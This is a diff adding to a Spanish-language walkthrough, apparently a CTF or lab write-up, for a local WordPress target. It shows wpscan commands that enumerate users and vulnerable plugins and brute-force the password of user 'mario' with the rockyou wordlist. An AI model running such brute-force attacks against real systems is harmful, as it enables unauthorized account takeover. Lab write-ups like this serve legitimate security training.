@@ -54,4 +54,18 @@ Nos ayudara a encontrar usuarios, plugins vulnerables, themes vulnerables, etc.
 wpscan --url http://172.17.0.2/wordpress -e vp,u --api-token=XXXXXXXXXXXXXXXXXXXXXXXX
 ```
 Este <a href="https://www.malcare.com/blog/how-to-use-wpscan/">link</a> te ayudara a conseguir tu api token que es completamente gratis
+![image](https://github.com/user-attachments/assets/927a0fc2-e15b-4daa-b882-384907bf19a4)
+
+<br>
+
+Con esto nosotros ya podemos realizar fuerza bruta al usuario <b>mario</b>.
+```bash
+wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt --api-token=XXXXXXXXXXXXXXXXXXXXXXXX
+```
+![image](https://github.com/user-attachments/assets/9fcf560f-5906-43fa-8d4b-783972cb3be7)
+
+
+<h2>FootHold</h2>
+<hr>
+
 
